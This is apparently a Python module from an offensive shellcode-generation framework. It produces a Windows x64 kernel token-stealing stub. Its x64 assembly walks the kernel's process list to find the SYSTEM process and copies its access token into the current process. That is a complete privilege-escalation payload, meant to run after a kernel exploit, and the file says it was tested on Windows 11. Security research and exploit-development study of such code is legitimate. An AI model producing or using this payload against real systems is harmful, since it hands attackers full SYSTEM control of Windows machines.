import sys
import math
import struct
import binascii

from sickle.common.lib.reversing.assembler import Assembler
from sickle.common.lib.generic.mparser import argument_check

class Shellcode():

    author      = "wetw0rk"
    description = "Windows (x64) Kernel Token Stealing Stub"
    example_run = f"{sys.argv[0]} -p windows/x64/kernel_token_stealer -f c"

    arguments = None

    tested_platforms = ["Windows 11"]

    def __init__(self, arg_object):


        self.arg_list = arg_object["positional arguments"]
        self.builder = Assembler('x64')

        return

    def generate_source(self):
        shellcode = """
        _start:
            mov rax, qword ptr gs:[0x188] ; Obtain the current thread ( nt!_KPCR.PcrbData.CurrentThread )
            mov rax, [rax + 0xb8]         ; Obtain the current process ( nt!_KTHREAD.ApcState.Process )
            mov rcx, rax                  ; Copy the current process _KPROCESS into rcx
            mov dl, 0x04                  ; SYSTEM PROCESS PID (PID to be searched for)
        traverseLinkedList:
            mov rax, [rax + 0x448]        ; Get the pointer to first entry ( nt!_EPROCESS.ActiveProcessLinks.Flink )
            sub rax, 0x448                ; Get the base address of the entry (_EPROCESS)
            cmp [rax + 0x440], dl         ; Check if we found the SYSTEM process ( nt!_EPROCESS.UniqueProcessId )
            jne traverseLinkedList        ; If not found continue the search...
        replaceToken:
            mov rdx, [rax + 0x4b8]        ; Get SYSTEM process ( nt!_EPROCESS.Token )
            mov [rcx + 0x4b8], rdx        ; Replace target process token ( nt!_EPROCESS.Token )
        """

        return shellcode

    def get_shellcode(self):
        """Generates Kernel Token Stealing Stub
        """

        return self.builder.get_bytes_from_asm(self.generate_source())

def generate():
    return Shellcode().get_shellcode()